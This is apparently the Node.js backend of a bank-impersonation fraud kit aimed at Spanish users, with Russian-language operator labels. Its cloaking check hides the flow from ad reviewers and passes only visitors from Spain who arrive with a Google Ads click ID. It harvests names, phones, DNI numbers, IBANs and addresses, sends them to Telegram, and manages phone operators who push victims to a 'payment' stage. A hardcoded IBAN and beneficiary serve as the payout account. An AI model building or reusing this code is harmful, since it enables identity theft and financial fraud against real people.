import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises';
import { createWriteStream as fsCreateWriteStream } from 'node:fs';
import { pipeline } from 'node:stream/promises';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { config } from './config.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CHAT_PROMPT_FILE = join(__dirname, '..', 'chat-prompt.md');
import { createAccessToken, isGranted } from './grantStore.js';
import { HUMAN_UI, BOT_UI } from './humanUi.js';
import { maskName, maskPhone, sanitizeString } from './mask.js';
import { sendToTelegram, sendToTelegramWithButton } from './telegram.js';
import { lookupGeoByIp } from './geoLookup.js';
import { prisma } from './db.js';
import { getBotConfig, updateBotConfig } from './ai/botConfig.js';
import { deepseekChat } from './ai/deepseek.js';
import { buildSystemPrompt } from './ai/promptBuilder.js';
import { randomUUID } from 'node:crypto';
import { sendPush } from './firebase.js';

// ── Sessions with 72-hour TTL, persisted to disk ─────────────────────────────
const SESSION_TTL = 72 * 60 * 60 * 1000;
const SESSIONS_FILE = join(process.cwd(), 'data', 'sessions.json');
// Maps: token -> expiresAt (ms timestamp)
const adminSessions = new Map();
const callerSessions = new Map();
const chatOpSessions = new Map();

function sessionValid(map, token) {
  const exp = map.get(token);
  if (!exp) return false;
  if (Date.now() > exp) { map.delete(token); return false; }
  return true;
}

function sessionAdd(map, token) {
  map.set(token, Date.now() + SESSION_TTL);
  saveSessions();
}

function saveSessions() {
  const data = {
    admin:  Object.fromEntries(adminSessions),
    caller: Object.fromEntries(callerSessions),
    chatOp: Object.fromEntries(chatOpSessions),
  };
  mkdir(join(process.cwd(), 'data'), { recursive: true })
    .then(() => writeFile(SESSIONS_FILE, JSON.stringify(data), 'utf8'))
    .catch(() => {});
}

async function loadSessions() {
  try {
    const raw = JSON.parse(await readFile(SESSIONS_FILE, 'utf8'));
    const now = Date.now();
    for (const [t, exp] of Object.entries(raw.admin  || {})) if (exp > now) adminSessions.set(t, exp);
    for (const [t, exp] of Object.entries(raw.caller || {})) if (exp > now) callerSessions.set(t, exp);
    for (const [t, exp] of Object.entries(raw.chatOp || {})) if (exp > now) chatOpSessions.set(t, exp);
  } catch { /* first run or corrupt file — start fresh */ }
}
await loadSessions();

// ── Payment screenshot status ─────────────────────────────────────────────────
const PAYMENT_STATUS_FILE = join(process.cwd(), 'data', 'payment-status.json');
const paymentStatus = new Map(); // sessionId -> { status: 'pending'|'confirmed'|'rejected', url, sentAt }
async function savePaymentStatus() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    const obj = {};
    for (const [k, v] of paymentStatus) obj[k] = v;
    await writeFile(PAYMENT_STATUS_FILE, JSON.stringify(obj), 'utf8');
  } catch {}
}
async function loadPaymentStatus() {
  try {
    const data = JSON.parse(await readFile(PAYMENT_STATUS_FILE, 'utf8'));
    for (const [k, v] of Object.entries(data)) paymentStatus.set(k, v);
  } catch {}
}
await loadPaymentStatus();

// ── App settings (IBAN / beneficiario) ───────────────────────────────────────
const SETTINGS_FILE = join(process.cwd(), 'data', 'app-settings.json');
const DEFAULT_SETTINGS = { iban: 'ES24 2080 9230 2150 3773 6219', beneficiario: 'Peter Harington' };
async function readSettings() {
  try { return { ...DEFAULT_SETTINGS, ...JSON.parse(await readFile(SETTINGS_FILE, 'utf8')) }; }
  catch { return { ...DEFAULT_SETTINGS }; }
}
async function writeSettings(data) {
  try { await mkdir(join(process.cwd(), 'data'), { recursive: true }); await writeFile(SETTINGS_FILE, JSON.stringify(data, null, 2), 'utf8'); }
  catch (e) { console.error('[settings] write error:', e?.message); }
}

// ── SSE broadcast ─────────────────────────────────────────────────────────────
const sseClients = new Set();

function broadcastUpdate(type = 'clients_changed') {
  const msg = `data: ${JSON.stringify({ type })}\n\n`;
  for (const raw of [...sseClients]) {
    try { raw.write(msg); } catch { sseClients.delete(raw); }
  }
}

function requireAdmin(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || !sessionValid(adminSessions, token)) {
    reply.status(401).send({ error: 'Unauthorized' });
    return false;
  }
  return true;
}

function requireCaller(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || (!sessionValid(callerSessions, token) && !sessionValid(adminSessions, token))) {
    reply.status(401).send({ error: 'Unauthorized' });
    return false;
  }
  return true;
}

// ── WebClient helpers ─────────────────────────────────────────────────────────
const STATUS_MAP = {
  tourist_bank_selected:        'КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:      'КЛИЕНТ ДОШЕЛ ДО LINK-BENEFIT',
  tourist_chat_reached:         'КЛИЕНТ ДОШЕЛ ДО ЧАТА',
  tourist_bot_started:          'БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue:'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:         'БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_card_page_opened:     'ОТКРЫЛ ФОРМУ',
  tourist_card_ordered:         'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
  tourist_call_requested:       'ЗАПРОСИЛ ЗВОНОК',
};

async function upsertWebClient(flowSessionId, patch = {}) {
  if (!flowSessionId) return null;
  try {
    return await prisma.webClient.upsert({
      where: { flowSessionId },
      create: { flowSessionId, ...patch },
      update: patch,
    });
  } catch { return null; }
}

async function createWebEvent(flowSessionId, clientId, event, extra = {}) {
  try {
    await prisma.webEvent.create({
      data: { flowSessionId, clientId: clientId || null, event, ...extra },
    });
  } catch { /* non-fatal */ }
}

const logDir = join(tmpdir(), config.logDirName);
const scratchLogFile = join(logDir, 'scratch-verify.log');

let logDirReady = false;
async function ensureLogDir() {
  if (logDirReady) return;
  try {
    await mkdir(logDir, { recursive: true });
    logDirReady = true;
  } catch (err) {
    if (err?.code === 'EEXIST') logDirReady = true;
    else console.error('Failed to create log dir:', err);
  }
}

async function appendJsonLine(file, entry) {
  try {
    await ensureLogDir();
    await appendFile(file, `${JSON.stringify(entry)}\n`);
  } catch (err) {
    console.error('Failed to append log:', err);
  }
}

function asRecord(v) {
  return v && typeof v === 'object' && !Array.isArray(v) ? v : null;
}
function getString(v) { return typeof v === 'string' ? v : ''; }
function getNumber(v) { return typeof v === 'number' && Number.isFinite(v) ? v : null; }
function getBoolean(v) { return typeof v === 'boolean' ? v : null; }

function getHeader(req, name) {
  const v = req.headers[name];
  if (Array.isArray(v)) return typeof v[0] === 'string' ? v[0].trim() : '';
  return typeof v === 'string' ? v.trim() : '';
}

function getClientIp(req) {
  const headers = ['cf-connecting-ip', 'true-client-ip', 'x-real-ip', 'x-client-ip', 'fly-client-ip'];
  let ip = '';
  for (const h of headers) {
    ip = getHeader(req, h);
    if (ip) break;
  }
  if (!ip) {
    const fwd = getHeader(req, 'x-forwarded-for');
    ip = fwd ? (fwd.split(',')[0]?.trim() ?? '') : '';
  }
  if (!ip) ip = req.ip || req.socket?.remoteAddress || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

function getGeoFromHeaders(req) {
  const country =
    getHeader(req, 'cf-ipcountry') ||
    getHeader(req, 'x-vercel-ip-country') ||
    getHeader(req, 'cloudfront-viewer-country') ||
    getHeader(req, 'x-country-code');
  if (!country || country.toUpperCase() === 'XX' || country.toUpperCase() === 'UNKNOWN') return null;
  return {
    country: country.toUpperCase(),
    city: getHeader(req, 'x-vercel-ip-city') || '',
    region: getHeader(req, 'x-vercel-ip-country-region') || '',
  };
}

async function resolveGeo(req, ip) {
  const headerGeo = getGeoFromHeaders(req);
  if (headerGeo) return { available: true, geo: headerGeo, source: 'headers' };
  return lookupGeoByIp(ip);
}

function buildBotResponse(flowSessionId, extra = {}) {
  const { token, shortId } = createAccessToken();
  const json = {
    status: true,
    url: config.redirects.botRedirectUrl || '',
    ui: BOT_UI,
    accessToken: token,
    allowed: false,
    ...extra,
  };
  return { shortId, json };
}

function sendGrantButton(message, shortId) {
  console.log(`[TG] sending grant button (shortId=${shortId})`);
  sendToTelegramWithButton(
    `${message}\n\n_Нажмите кнопку чтобы дать пользователю доступ._`,
    `grant_${shortId}`,
  );
}

async function handleScratchAccess(req, reply) {
  const token = req.params.token || '';
  if (!token) return reply.status(400).send({ allowed: false });
  reply.header('Cache-Control', 'no-store, no-cache, must-revalidate');
  reply.header('Pragma', 'no-cache');
  reply.header('Expires', '0');
  if (!isGranted(token)) return reply.send({ allowed: false });
  return reply.send({
    allowed: true,
    status: false,
    url: config.redirects.humanRedirectUrl,
    ui: HUMAN_UI,
  });
}

async function handleScratchVerify(req, reply) {
  console.log(`[scratch-verify] IN  ip=${getClientIp(req)}`);
  try {
    const body = asRecord(req.body) ?? {};
    const ip = getClientIp(req);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80) || null;

    const geoResult = await resolveGeo(req, ip);
    const country = geoResult.geo?.country || 'UNKNOWN';
    const city = geoResult.geo?.city || '';
    const region = geoResult.geo?.region || '';
    const postal = geoResult.geo?.postal || '';

    const pointerEvents = asRecord(body.pointerEvents);
    const bbox = asRecord(body.bbox);
    const canvas = asRecord(body.canvas);
    const clearedPercent = getNumber(body.clearedPercent);

    if (clearedPercent === null || !pointerEvents || !bbox || !canvas) {
      const text = [
        '*SCRATCH - INVALID PAYLOAD*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
        'Reason: missing required fields',
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_payload',
      });
      return reply.send(json);
    }

    const canvasWidth = getNumber(canvas.canvasWidth);
    const canvasHeight = getNumber(canvas.canvasHeight);
    const bboxWidth = getNumber(bbox.bboxWidth) ?? 0;
    const bboxHeight = getNumber(bbox.bboxHeight) ?? 0;

    if (canvasWidth === null || canvasHeight === null) {
      const text = [
        '*SCRATCH - INVALID METRICS*',
        flowSessionId ? `Session: \`${flowSessionId}\`` : '',
        `IP: \`${ip}\``,
        `Country: *${country}*`,
      ].filter(Boolean).join('\n');
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(text, shortId);
      await appendJsonLine(scratchLogFile, {
        ts: new Date().toISOString(), flowSessionId, ip, country, verdict: 'invalid_metrics',
      });
      return reply.send(json);
    }

    const hasPointerDown = getBoolean(pointerEvents.hasPointerDown) ?? false;
    const hasPointerMove = getBoolean(pointerEvents.hasPointerMove) ?? false;
    const reasons = [];

    const clearedOk = clearedPercent >= 70;
    reasons.push(clearedOk ? `cleared: ${clearedPercent.toFixed(1)}% ok` : `cleared: ${clearedPercent.toFixed(1)}% fail`);

    const pointerAllOk = hasPointerDown && hasPointerMove;
    reasons.push(pointerAllOk ? 'pointer: ok' : 'pointer: fail');

    const widthCoverage = canvasWidth > 0 ? bboxWidth / canvasWidth : 0;
    const heightCoverage = canvasHeight > 0 ? bboxHeight / canvasHeight : 0;
    const widthValid = widthCoverage >= 0.4;
    const heightValid = heightCoverage >= 0.4;
    reasons.push(widthValid ? 'widthCov: ok' : `widthCov: ${(widthCoverage * 100).toFixed(0)}% fail`);
    reasons.push(heightValid ? 'heightCov: ok' : `heightCov: ${(heightCoverage * 100).toFixed(0)}% fail`);

    const hasCountry = Boolean(geoResult.geo?.country);
    const geoOk = hasCountry && country === 'ES';
    if (!geoResult.available) reasons.push('geo: unavailable');
    else if (!hasCountry) reasons.push('geo: UNKNOWN fail');
    else reasons.push(geoOk ? 'geo: ES ok' : `geo: ${country} fail`);

    const rawQuery = getString(body.query);
    const hasGclid = rawQuery.toLowerCase().includes('gclid');
    reasons.push(hasGclid ? 'gclid: ok' : 'gclid: fail');

    const humanLike = clearedOk && pointerAllOk && widthValid && heightValid;
    const approved = humanLike && geoOk && hasGclid;

    const user = asRecord(body.user) ?? {};
    const userName = getString(user.name);
    const userPhone = getString(user.phone);

    const lines = [
      `*SCRATCH - ${approved ? 'HUMAN' : 'BOT'}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      '',
      `IP: \`${ip}\``,
      `Country: *${country}* ${city ? `(${city})` : ''}`,
      `Query: \`${rawQuery || 'empty'}\``,
      '',
      `Login: ${userName || '-'}`,
      `Phone: ${userPhone || '-'}`,
      '',
      reasons.join('\n'),
      '',
      `humanLike: ${humanLike ? 'YES' : 'NO'}`,
      `geoOk: ${geoOk ? 'YES' : 'NO'}`,
      `hasGclid: ${hasGclid ? 'YES' : 'NO'}`,
      `Result: ${approved ? 'APPROVED → link-bank' : 'REJECTED → ожидание TG'}`,
    ].filter(Boolean);

    console.log(`[scratch-verify] verdict=${approved ? 'HUMAN' : 'BOT'} ip=${ip} country=${country}`);

    if (approved) sendToTelegram(lines.join('\n'));

    await appendJsonLine(scratchLogFile, {
      ts: new Date().toISOString(),
      flowSessionId, ip, country, city, postal,
      user: { name: maskName(userName), phone: maskPhone(userPhone) },
      verdict: approved ? 'human' : 'bot',
      humanLike, geoOk, hasGclid, reasons,
    });

    if (!approved) {
      const { json, shortId } = buildBotResponse(flowSessionId, { geo: { country, city, region, postal } });
      sendGrantButton(lines.join('\n'), shortId);
      return reply.send(json);
    }

    return reply.send({
      status: false,
      url: config.redirects.humanRedirectUrl,
      ui: HUMAN_UI,
      allowed: true,
      accessToken: null,
      geo: { country, city, region, postal },
    });
  } catch (err) {
    console.error('[SCRATCH-VERIFY ERROR]', err);
    const { json } = buildBotResponse(null);
    return reply.send(json);
  }
}

// ─── Tourist status tracking (/api/track) ────────────────────────────────────

const TOURIST_STATUS_LABELS = {
  tourist_active:              '🏦 КЛИЕНТ ВОШЁЛ В ЛИЧНЫЙ КАБИНЕТ (activeLead)',
  newcomer_active:             '🏦 НОВИЧОК ВОШЁЛ В ЛИЧНЫЙ КАБИНЕТ (activeLead)',
  tourist_bank_selected:       '1️⃣ КЛИЕНТ ВЫБРАЛ БАНК',
  tourist_benefit_reached:     '📋 Клиент открыл страницу ожидания',
  tourist_chat_opened:         '🔗 Клиент нажал «Iniciar conversación»',
  tourist_chat_reached:        '2️⃣ КЛИЕНТ ДОШЁЛ ДО ЧАТА',
  tourist_bot_started:         '3️⃣ БОТ НАЧАЛ ДИАЛОГ',
  tourist_bot_finished_dialogue: '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ',
  tourist_bot_finished:        '4️⃣ БОТ ЗАКОНЧИЛ ДИАЛОГ (кнопка нажата)',
  tourist_card_page_opened:    '📝 Клиент открыл форму заявки',
  tourist_card_ordered:        '5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
};

async function handleTrack(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const event = sanitizeString(getString(body.event), 80);
    if (!event) return reply.status(400).send({ ok: false });

    const email = sanitizeString(getString(body.email), 200);
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const bank = sanitizeString(getString(body.bank), 120);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    // Persist to DB
    const status = STATUS_MAP[event];
    const patch = {};
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (ip) patch.ip = ip;
    if (status) patch.status = status;

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, event, { bank: bank || null, email: email || null, ip: ip || null });

    // Telegram notification
    const label = TOURIST_STATUS_LABELS[event] || `📌 ${event}`;
    const lines = [
      `*${label}*`,
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);

    sendToTelegram(lines.join('\n'));
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[track] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Tourist: call request + status polling ───────────────────────────────────

async function handleCallRequest(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const email = sanitizeString(getString(body.email), 200);
    const bank = sanitizeString(getString(body.bank), 120);
    const nombre = sanitizeString(getString(body.nombre), 200);
    const phone = sanitizeString(getString(body.phone), 30);
    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';

    // Если клиент уже был прозвонен — это повторный запрос → переводим в старые клиенты
    let wasAlreadyCalled = false;
    let existingSub = {};
    if (flowSessionId) {
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { operatorCalled: true, operatorStatus: true, submissionData: true },
        });
        wasAlreadyCalled = !!(existing?.operatorCalled ||
          (existing?.operatorStatus && existing.operatorStatus !== 'pending'));
        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
      } catch { /* колонки могут ещё не существовать */ }
    }

    const patch = {
      callRequested: true,
      status: 'ЗАПРОСИЛ ЗВОНОК (ПОВТОРНО)',
    };
    if (email) patch.email = email;
    if (bank) patch.bank = bank;
    if (nombre) patch.nombre = nombre;
    if (ip) patch.ip = ip;
    if (phone) patch.submissionData = { ...existingSub, phone };

    if (wasAlreadyCalled) {
      patch.operatorStatus = 'pending';
      patch.operatorCalled = false;
      patch.calledAt = null;
      patch.status = 'ПОВТОРНЫЙ ЗАПРОС ЗВОНКА';
    }

    const client = flowSessionId ? await upsertWebClient(flowSessionId, patch) : null;
    await createWebEvent(flowSessionId, client?.id, 'tourist_call_requested', { bank: bank || null, email: email || null, ip: ip || null, repeated: wasAlreadyCalled });

    const lines = [
      wasAlreadyCalled ? '*🔄 ПОВТОРНЫЙ ЗАПРОС ЗВОНКА (→ Старые клиенты)*' : '*📞 ЗАПРОСИЛ ЗВОНОК*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      nombre ? `Имя: *${nombre}*` : '',
      bank ? `Банк: *${bank}*` : '',
      email ? `Email: ${email}` : '',
      phone ? `Тел: ${phone}` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));
    broadcastUpdate('clients_changed');

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[call-request] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

async function handleTouristStatus(req, reply) {
  reply.header('Cache-Control', 'no-store');
  try {
    const flowSessionId = sanitizeString(req.query.s || '', 80);
    if (!flowSessionId) return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });

    let client = null;
    try {
      client = await prisma.webClient.findUnique({
        where: { flowSessionId },
        select: { operatorCalled: true, status: true, operatorStatus: true, submissionData: true, nombre: true },
      });
    } catch (e) {
      if (e?.code === 'P2022') {
        client = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { operatorCalled: true, status: true, nombre: true },
        });
      } else throw e;
    }

    const sub = (client?.submissionData && typeof client.submissionData === 'object') ? client.submissionData : {};
    const opStatus = client?.operatorStatus ?? (client?.operatorCalled ? 'called' : 'pending');
    return reply.send({
      operatorCalled: client?.operatorCalled ?? false,
      operatorStatus: opStatus,
      iban: sub.iban || '',
      nombre: client?.nombre || sub.nombre || '',
    });
  } catch {
    return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });
  }
}

// ─── Credit card form submission ──────────────────────────────────────────────

async function handleCreditCardSubmission(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    const formData = {
      nombre: sanitizeString(getString(body.nombre), 200),
      phone: sanitizeString(getString(body.phone), 30),
      dni: sanitizeString(getString(body.dni), 20),
      iban: sanitizeString(getString(body.iban), 50),
      calle: sanitizeString(getString(body.calle), 300),
      piso: sanitizeString(getString(body.piso), 100),
      ciudad: sanitizeString(getString(body.ciudad), 100),
      provincia: sanitizeString(getString(body.provincia), 100),
      cp: sanitizeString(getString(body.cp), 10),
      email: sanitizeString(getString(body.email), 200),
    };

    // Merge with existing submissionData to preserve DNI/IBAN collected during chat
    let existingSub = {};
    if (flowSessionId) {
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId },
          select: { submissionData: true },
        });
        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object')
          ? existing.submissionData : {};
      } catch { /* non-fatal */ }
    }

    const submissionData = { ...existingSub };
    for (const [k, v] of Object.entries(formData)) {
      if (v) submissionData[k] = v;
    }
    // Preserve DNI/IBAN from chat if form doesn't supply them
    if (!formData.dni && existingSub.dni) submissionData.dni = existingSub.dni;
    if (!formData.iban && existingSub.iban) submissionData.iban = existingSub.iban;

    if (flowSessionId) {
      await upsertWebClient(flowSessionId, {
        nombre: submissionData.nombre || undefined,
        email: submissionData.email || undefined,
        status: 'КЛИЕНТ ЗАПОЛНИЛ ФОРМУ',
        submissionData,
      });
    }

    const ip = getClientIp(req);
    const country = getGeoFromHeaders(req)?.country || '';
    const lines = [
      '*5️⃣ КЛИЕНТ ЗАПОЛНИЛ ФОРМУ*',
      flowSessionId ? `Session: \`${flowSessionId}\`` : '',
      submissionData.nombre ? `Имя: *${submissionData.nombre}*` : '',
      submissionData.email ? `Email: ${submissionData.email}` : '',
      submissionData.iban ? `IBAN: \`${submissionData.iban}\`` : '',
      submissionData.dni ? `DNI: \`${submissionData.dni}\`` : '',
      `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
    ].filter(Boolean);
    sendToTelegram(lines.join('\n'));

    return reply.send({ ok: true });
  } catch (err) {
    console.error('[credit-card-submission] error:', err?.message || err);
    return reply.status(500).send({ ok: false });
  }
}

// ─── Caller admin ─────────────────────────────────────────────────────────────

async function handleCallerLogin(req, reply) {
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (login !== config.caller.login || password !== config.caller.password) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  const token = randomUUID() + randomUUID();
  sessionAdd(callerSessions, token);
  return reply.send({ token });
}

async function handleCallerClients(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const clients = await prisma.webClient.findMany({
      where: { callRequested: true, operatorCalled: false },
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true, flowSessionId: true, email: true, bank: true,
        nombre: true, ip: true, status: true, clientType: true,
        operatorCalled: true, calledAt: true, createdAt: true,
        callerNote: true, operatorStatus: true, submissionData: true,
        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
      },
    });
    return reply.send({ clients });
  } catch (err) {
    console.error('[caller-clients] primary query error, trying fallback:', err?.message || err);
    try {
      const clients = await prisma.webClient.findMany({
        where: { callRequested: true, clientType: { not: 'olduser' }, operatorCalled: false },
        orderBy: { updatedAt: 'desc' },
        select: {
          id: true, flowSessionId: true, email: true, bank: true,
          nombre: true, ip: true, status: true,
          operatorCalled: true, calledAt: true, createdAt: true,
          callerNote: true, submissionData: true,
          events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
        },
      });
      return reply.send({ clients });
    } catch (err2) {
      console.error('[caller-clients] fallback error:', err2?.message || err2);
      return reply.status(500).send({ error: 'server_error' });
    }
  }
}

async function handleCallerSetOperatorStatus(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const status = sanitizeString(getString(body.status), 20);
    if (!['pending', 'called', 'payment'].includes(status)) {
      return reply.status(400).send({ error: 'invalid_status' });
    }
    // Read previous status before update so we can detect first-time 'called'
    let prevOperatorStatus = null;
    try {
      const prev = await prisma.webClient.findUnique({ where: { id }, select: { operatorStatus: true } });
      prevOperatorStatus = prev?.operatorStatus ?? null;
    } catch { /* ignore */ }

    const data = { operatorStatus: status };
    if (status !== 'pending') {
      data.operatorCalled = true;
      data.calledAt = new Date();
      data.status = status === 'payment' ? 'НА ЭТАПЕ ОПЛАТЫ' : 'ОПЕРАТОР ПРОЗВОНИЛ';
    } else {
      data.operatorCalled = false;
      data.calledAt = null;
    }
    try {
      await prisma.webClient.update({ where: { id }, data });
    } catch (fieldErr) {
      if (fieldErr?.message?.includes('operatorStatus') || fieldErr?.code === 'P2022') {
        const { operatorStatus: _s, ...fallbackData } = data;
        await prisma.webClient.update({ where: { id }, data: fallbackData });
      } else {
        throw fieldErr;
      }
    }
    broadcastUpdate('clients_changed');
    // Inject action buttons only once — check DB to avoid re-sending on repeated calls
    if (status === 'called') {
      try {
        const wc = await prisma.webClient.findUnique({ where: { id }, select: { flowSessionId: true } });
        if (wc?.flowSessionId) {
          const lead = await prisma.lead.findUnique({ where: { tgId: chatLeadKey(wc.flowSessionId) } });
          if (lead) {
            const alreadySent = await prisma.message.findFirst({
              where: { leadId: lead.id, content: 'CALLER_ACTION_BUTTONS' },
            });
            if (!alreadySent) {
              await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: 'CALLER_ACTION_BUTTONS' } });
              schedulePush(wc.flowSessionId);
            }
          }
        }
      } catch (chainErr) {
        console.error('[caller-set-status] chain error:', chainErr?.message || chainErr);
      }
    }
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-set-status] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}


async function handleCallerMarkCalled(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const now = new Date();
    const client = await prisma.webClient.update({
      where: { id },
      data: { operatorCalled: true, calledAt: now, status: 'ОПЕРАТОР ПРОЗВОНИЛ' },
    });
    // Create a call log entry for audit history
    await prisma.callLog.create({ data: { clientId: id, note: 'Первичный звонок' } }).catch(() => {});
    sendToTelegram(`*✅ ОПЕРАТОР ПРОЗВОНИЛ*\nSession: \`${client.flowSessionId}\`\nБанк: *${client.bank || '—'}*\nEmail: ${client.email || '—'}`);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-mark] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleCallerNote(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const note = sanitizeString(getString(body.note), 2000);
    await prisma.webClient.update({ where: { id }, data: { callerNote: note || null } });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[caller-note] error:', err?.message || err);
    // callerNote column may not exist yet — tell client to run db migration
    if (err?.message?.includes('callerNote') || err?.code === 'P2022') {
      return reply.status(503).send({ error: 'db_migration_needed', hint: 'Run: prisma db push' });
    }
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGetCallLogs(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const [logs, clients] = await Promise.all([
      prisma.callLog.findMany({
        orderBy: { createdAt: 'desc' },
        take: 300,
        include: {
          client: {
            select: { id: true, flowSessionId: true, nombre: true, email: true, bank: true, ip: true, status: true },
          },
        },
      }),
      prisma.webClient.findMany({
        where: { callRequested: true },
        orderBy: { updatedAt: 'desc' },
        select: { id: true, nombre: true, email: true, bank: true },
      }),
    ]);
    return reply.send({ logs, clients });
  } catch (err) {
    console.error('[call-logs] error:', err?.message || err);
    // CallLog table may not exist yet — return empty gracefully
    try {
      const clients = await prisma.webClient.findMany({
        where: { callRequested: true },
        orderBy: { updatedAt: 'desc' },
        select: { id: true, nombre: true, email: true, bank: true },
      });
      return reply.send({ logs: [], clients, _warning: 'db_migration_needed' });
    } catch (err2) {
      return reply.status(500).send({ error: 'server_error' });
    }
  }
}

async function handleAddCallLog(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const clientId = sanitizeString(getString(body.clientId), 40);
    const note = sanitizeString(getString(body.note), 2000);
    if (!clientId) return reply.status(400).send({ error: 'clientId required' });
    const log = await prisma.callLog.create({ data: { clientId, note: note || null } });
    broadcastUpdate('logs_changed');
    return reply.send({ ok: true, log });
  } catch (err) {
    console.error('[add-call-log] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleMarkCallLog(req, reply) {
  if (!requireCaller(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    await prisma.callLog.update({ where: { id }, data: { markedAt: new Date() } });
    broadcastUpdate('logs_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[mark-call-log] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleSSE(req, reply) {
  const token = sanitizeString(String(req.query.token || ''), 120);
  if (!token || (!sessionValid(adminSessions, token) && !sessionValid(callerSessions, token))) {
    return reply.status(401).send({ error: 'Unauthorized' });
  }
  reply.hijack();
  const raw = reply.raw;
  raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  raw.write('data: {"type":"connected"}\n\n');
  sseClients.add(raw);
  const ping = setInterval(() => {
    try { raw.write(':ping\n\n'); } catch { clearInterval(ping); sseClients.delete(raw); }
  }, 20000);
  req.raw.on('close', () => { clearInterval(ping); sseClients.delete(raw); });
}

// ─── Full admin: clients list ─────────────────────────────────────────────────

async function handleAdminDeleteClient(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    if (!id) return reply.status(400).send({ error: 'missing_id' });
    await prisma.$transaction([
      prisma.webEvent.deleteMany({ where: { clientId: id } }),
      prisma.callLog.deleteMany({ where: { clientId: id } }),
